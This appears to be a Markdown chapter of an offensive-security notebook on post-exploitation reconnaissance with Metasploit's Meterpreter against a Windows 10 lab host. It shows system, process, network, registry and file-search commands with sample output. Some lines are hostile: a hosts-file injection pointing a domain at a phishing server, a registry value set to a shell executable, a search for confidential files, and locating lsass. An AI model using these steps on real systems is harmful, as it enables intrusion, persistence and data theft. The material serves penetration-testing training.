# 02 - Internal Reconnaissance

Search Tag(s): #metasploit-framework #command-and-control #interactive-shell

## 2.1 - System

* Show hardware information of the host

```
meterpreter > sysinfo
Computer        : DEFALT
OS              : Windows 10 (10.0 Build 22000).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

* Retrieve UUID

`meterpreter > uuid`

* Get current session ID

`meterpreter > machine_id`

* Discover Username
 
```
meterpreter > getuid
Server username: Defalt\Winpwn10
```

* Discover SID

```
meterpreter > getsid
Server SID: S-1-5-21-2079428845-521281716-553417191-1001
```

* Retrieve Privileges

```
meterpreter > getprivs
Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```


```
meterpreter > show_mount
Mounts / Drives
===============

Name  Type   Size (Total)  Size (Free)  Mapped to
----  ----   ------------  -----------  ---------
C:\   fixed  79.29 GiB     38.84 GiB
D:\   cdrom  0.00 B        0.00 B


Total mounts/drives: 2
```

```
meterpreter > idletime
User has been idle for: 3 mins 38 secs
```

```
meterpreter > localtime
Local Date/Time: 2022-05-14 14:39:41.311 Pacific Daylight Time (UTC-800)
```

## 2.2 - Processes

### 2.2.1 - List Processes

```
meterpreter > ps -h
Usage: ps [ options ] pattern

Use the command with no arguments to see all running processes.
The following options can be used to filter those results:

OPTIONS:

    -A   Filter on architecture
    -c   Filter only child processes of the current shell
    -h   Help menu.
    -S   Filter on process name
    -s   Filter only SYSTEM processes
    -U   Filter on user name
    -x   Filter for exact matches rather than regex

meterpreter > ps -S svchost.exe
Filtering on 'svchost.exe'

Process List
============

 PID   PPID  Name         Arch  Session  User             Path
 ---   ----  ----         ----  -------  ----             ----
 536   672   svchost.exe
 632   672   svchost.exe
 788   672   svchost.exe
 924   672   svchost.exe
 976   672   svchost.exe
 980   672   svchost.exe
 1068  672   svchost.exe
 1084  672   svchost.exe
 1096  672   svchost.exe
 1136  672   svchost.exe
 1160  672   svchost.exe
 1196  672   svchost.exe
 1364  672   svchost.exe  x64   1        Defalt\Winpwn10  C:\Windows\System32\svchost.exe
 ..[snip]..

meterpreter > ps -s
Filtering on SYSTEM processes...

Process List
============

 PID   PPID  Name                Arch  Session  User                 Path
 ---   ----  ----                ----  -------  ----                 ----
 536   672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 632   672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 636   536   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM  C:\Windows\System32\winlogon.exe
 696   544   lsass.exe           x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe
 788   672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 980   672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1096  672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1196  672   svchost.exe         x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
..[snip]..

meterpreter > ps -U Winpwn10
Filtering on user 'Winpwn10'

Process List
============

 PID   PPID  Name                       Arch  Session  User             Path
 ---   ----  ----                       ----  -------  ----             ----
 208   788   MiniSearchHost.exe         x64   1        Defalt\Winpwn10  C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\MiniSearchHost.exe
 288   4268  OneDrive.exe               x64   1        Defalt\Winpwn10  C:\Users\Winpwn10\AppData\Local\Microsoft\OneDrive\OneDrive.exe
 784   2164  msedgewebview2.exe         x64   1        Defalt\Winpwn10  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\101.0.1210.39\msedgewebview2.exe
 1364  672   svchost.exe                x64   1        Defalt\Winpwn10  C:\Windows\System32\svchost.exe
 1472  788   ApplicationFrameHost.exe   x64   1        Defalt\Winpwn10  C:\Windows\System32\ApplicationFrameHost.exe
 2060  788   SystemSettings.exe         x64   1        Defalt\Winpwn10  C:\Windows\ImmersiveControlPanel\SystemSettings.exe
 2164  5748  msedgewebview2.exe         x64   1        Defalt\Winpwn10  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\101.0.1210.39\msedgewebview2.exe
..[snip]..
```

### 2.2.2 - Filter Processes

TODO: Fill this info

1. Filter to retrieve process ID

```
meterpreter > pgrep -h
Usage: pgrep [ options ] pattern
Filter processes by name.

OPTIONS:

    -A   Filter on architecture
    -c   Filter only child processes of the current shell
    -f   Display process path and args with PID (combine with -l)
    -h   Help menu.
    -l   Display process name with PID
    -S   Filter on process name
    -s   Filter only SYSTEM processes
    -U   Filter on user name
    -x   Filter for exact matches rather than regex

meterpreter > pgrep <process_name>

meterpreter > pgrep lsass
696
```

## 2.3 - Networking

* Help Menu

```
Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table
```

* IP Address

```
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:3c:90:25
MTU          : 1500
IPv4 Address : 10.0.2.15
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::60ca:62c2:b4fd:807a
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

* Netstat

```
meterpreter > netstat

Connection list
===============

    Proto  Local address                    Remote address      State        User  Inode  PID/Program name
    -----  -------------                    --------------      -----        ----  -----  ----------------
    tcp    0.0.0.0:135                      0.0.0.0:*           LISTEN       0     0      924/svchost.exe
    tcp    0.0.0.0:445                      0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:5040                     0.0.0.0:*           LISTEN       0     0      5112/svchost.exe
    tcp    0.0.0.0:7680                     0.0.0.0:*           LISTEN       0     0      7780/svchost.exe
    tcp    0.0.0.0:49664                    0.0.0.0:*           LISTEN       0     0      696/lsass.exe
    tcp    0.0.0.0:49665                    0.0.0.0:*           LISTEN       0     0      544/wininit.exe
    tcp    0.0.0.0:49666                    0.0.0.0:*           LISTEN       0     0      632/svchost.exe
    tcp    0.0.0.0:49667                    0.0.0.0:*           LISTEN       0     0      1540/svchost.exe
    tcp    0.0.0.0:49668                    0.0.0.0:*           LISTEN       0     0      2120/spoolsv.exe
    tcp    0.0.0.0:49669                    0.0.0.0:*           LISTEN       0     0      672/services.exe
    tcp    10.0.2.15:139                    0.0.0.0:*           LISTEN       0     0      4/System
    tcp    10.0.2.15:49928                  20.198.162.78:443   ESTABLISHED  0     0      2548/svchost.exe
    tcp    10.0.2.15:49980                  10.0.2.4:445        ESTABLISHED  0     0      7268/powershell.exe
    tcp    10.0.2.15:49999                  52.179.216.235:443  TIME_WAIT    0     0      0/[System Process]
    tcp6   :::135                           :::*                LISTEN       0     0      924/svchost.exe
    tcp6   :::445                           :::*                LISTEN       0     0      4/System
    tcp6   :::7680                          :::*                LISTEN       0     0      7780/svchost.exe
    tcp6   :::49664                         :::*                LISTEN       0     0      696/lsass.exe
    tcp6   :::49665                         :::*                LISTEN       0     0      544/wininit.exe
    tcp6   :::49666                         :::*                LISTEN       0     0      632/svchost.exe
    tcp6   :::49667                         :::*                LISTEN       0     0      1540/svchost.exe
    tcp6   :::49668                         :::*                LISTEN       0     0      2120/spoolsv.exe
    tcp6   :::49669                         :::*                LISTEN       0     0      672/services.exe
    udp    0.0.0.0:123                      0.0.0.0:*                        0     0      7200/svchost.exe
    udp    0.0.0.0:5050                     0.0.0.0:*                        0     0      5112/svchost.exe
    udp    0.0.0.0:5353                     0.0.0.0:*                        0     0      1436/svchost.exe
    udp    0.0.0.0:5355                     0.0.0.0:*                        0     0      1436/svchost.exe
    udp    0.0.0.0:56498                    0.0.0.0:*                        0     0      1436/svchost.exe
    udp    0.0.0.0:58224                    0.0.0.0:*                        0     0      1436/svchost.exe
    udp    10.0.2.15:137                    0.0.0.0:*                        0     0      4/System
    udp    10.0.2.15:138                    0.0.0.0:*                        0     0      4/System
    udp    10.0.2.15:1900                   0.0.0.0:*                        0     0      7044/svchost.exe
    udp    10.0.2.15:63859                  0.0.0.0:*                        0     0      7044/svchost.exe
    udp    127.0.0.1:1900                   0.0.0.0:*                        0     0      7044/svchost.exe
    udp    127.0.0.1:59238                  0.0.0.0:*                        0     0      2428/svchost.exe
    udp    127.0.0.1:63860                  0.0.0.0:*                        0     0      7044/svchost.exe
    udp6   :::123                           :::*                             0     0      7200/svchost.exe
    udp6   :::5353                          :::*                             0     0      1436/svchost.exe
    udp6   :::5355                          :::*                             0     0      1436/svchost.exe
    udp6   :::56498                         :::*                             0     0      1436/svchost.exe
    udp6   :::58224                         :::*                             0     0      1436/svchost.exe
    udp6   ::1:1900                         :::*                             0     0      7044/svchost.exe
    udp6   ::1:63858                        :::*                             0     0      7044/svchost.exe
    udp6   fe80::60ca:62c2:b4fd:807a:1900   :::*                             0     0      7044/svchost.exe
    udp6   fe80::60ca:62c2:b4fd:807a:63857  :::*                             0     0      7044/svchost.exe
```

* ARP

```
meterpreter > arp

ARP cache
=========

    IP address       MAC address        Interface
    ----------       -----------        ---------
    10.0.2.1         52:54:00:12:35:00  12
    10.0.2.3         08:00:27:32:5d:a1  12
    10.0.2.4         08:00:27:8f:39:74  12
    10.0.2.255       ff:ff:ff:ff:ff:ff  12
    224.0.0.22       00:00:00:00:00:00  1
    224.0.0.22       01:00:5e:00:00:16  12
    224.0.0.251      01:00:5e:00:00:fb  12
    224.0.0.252      01:00:5e:00:00:fc  12
    239.255.255.250  00:00:00:00:00:00  1
    239.255.255.250  01:00:5e:7f:ff:fa  12
    255.255.255.255  ff:ff:ff:ff:ff:ff  12
```

* Route

```
meterpreter > route -h
Usage: route [-h] command [args]

Display or modify the routing table on the remote machine.

Supported commands:

   add    [subnet] [netmask] [gateway]
   delete [subnet] [netmask] [gateway]
   list



OPTIONS:

    -h  Help banner.

meterpreter > route

IPv4 network routes
===================

    Subnet           Netmask          Gateway    Metric  Interface
    ------           -------          -------    ------  ---------
    0.0.0.0          0.0.0.0          10.0.2.1   25      12
    10.0.2.0         255.255.255.0    10.0.2.15  281     12
    10.0.2.15        255.255.255.255  10.0.2.15  281     12
    10.0.2.255       255.255.255.255  10.0.2.15  281     12
    127.0.0.0        255.0.0.0        127.0.0.1  331     1
    127.0.0.1        255.255.255.255  127.0.0.1  331     1
    127.255.255.255  255.255.255.255  127.0.0.1  331     1
    224.0.0.0        240.0.0.0        127.0.0.1  331     1
    224.0.0.0        240.0.0.0        10.0.2.15  281     12
    255.255.255.255  255.255.255.255  127.0.0.1  331     1
    255.255.255.255  255.255.255.255  10.0.2.15  281     12

No IPv6 routes were found.
```

* Proxy

```
meterpreter > getproxy
Auto-detect     : Yes
Auto config URL :
Proxy URL       :
Proxy Bypass    :
```

* Resolve DNS

```
meterpreter > resolve -h
Usage: resolve host1 host2 .. hostN [-h] [-f IPv4|IPv6]


OPTIONS:

    -f   Address family - IPv4 or IPv6 (default IPv4)
    -h   Help banner.

meterpreter > resolve <computer_name> -f <IPv4 | IPv6>

meterpreter > resolve 10.0.2.3

Host resolutions
================

    Hostname  IP Address
    --------  ----------
    10.0.2.3  10.0.2.3
```

* Inject DNS Hosts

```
msf > use post/windows/manage/inject_host

msf post(windows/manage/inject_host) > options

Module options (post/windows/manage/inject_host):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   DOMAIN                    yes       Domain name for host file manipulation.
   IP                        yes       IP address to point domain name to.
   SESSION                   yes       The session to run this module on

msf post(windows/manage/inject_host) > set domain <domain_name>

msf post(windows/manage/inject_host) > set ip <phishing_server>

msf post(windows/manage/inject_host) > set session <session_id>

msf post(windows/manage/inject_host) > run
```

## 2.4 - Registry

* Help Menu

```
meterpreter > reg -h
Usage: reg [command] [options]
Interact with the target machine's registry.

OPTIONS:

    -d   The data to store in the registry value.
    -h   Help menu.
    -k   The registry key path (E.g. HKLM\Software\Foo).
    -r   The remote machine name to connect to (with current process credentials
    -t   The registry value type (E.g. REG_SZ).
    -v   The registry value name (E.g. Stuff).
    -w   Set KEY_WOW64 flag, valid values [32|64].
COMMANDS:

    enumkey     Enumerate the supplied registry key [-k <key>]
    createkey   Create the supplied registry key  [-k <key>]
    deletekey   Delete the supplied registry key  [-k <key>]
    queryclass  Queries the class of the supplied key [-k <key>]
    setval      Set a registry value [-k <key> -v <val> -d <data>]
    deleteval   Delete the supplied registry value [-k <key> -v <val>]
    queryval    Queries the data contents of a value [-k <key> -v <val>]
```

### 2.4.1 - Basic Commands

- Syntax registry meterpreter command.

`meterpreter > reg <command> [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <registry_value> -t <registry_type>`

- Enumerate registry key.

`meterpreter > reg enumkey [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key`

- Set registry key value.

`meterpreter > reg setval [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <value> -t <registry_type> -d 'C:\path\to\shell.exe'`

- Query registry key value.

`meterpreter > reg queryval [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <value>`

- Delete registry key value.

`meterpreter > reg deleteval [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\key -v <value>`

- Create registry subkey.

`meterpreter > reg createkey [-r <target_IP>] -k <hive_name>\\path\\to\\registry\\new_key [-w <32 | 64>]`

- Query registry keys

`meterpreter > reg queryclass [-r <target_IP>] -k <hive_name>\\path\\to\\registry`

## 2.5 - Search Files

```
meterpreter > search -h
Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...
Search for files.

OPTIONS:

    -a   Find files modified after timestamp (UTC).  Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
    -b   Find files modified before timestamp (UTC). Format: YYYY-mm-dd or YYYY-mm-ddTHH:MM:SS
    -d   The directory/drive to begin searching from. Leave empty to search all drives. (Default: )
    -f   A file pattern glob to search for. (e.g. *secret*.doc?)
    -h   Help Banner
    -r   Recursively search sub directories. (Default: true)
```

* Basic Commands

`meterpreter > search -d [<drive_letter>:]/path/to/directory/ -f confidential*`

---
## References

- [Metasploit Unleashed: Interacting Registry](https://www.offsec.com/metasploit-unleashed/interacting-registry/)

- [Metasploit Unleashed: Searching Content](https://www.offsec.com/metasploit-unleashed/searching-content/)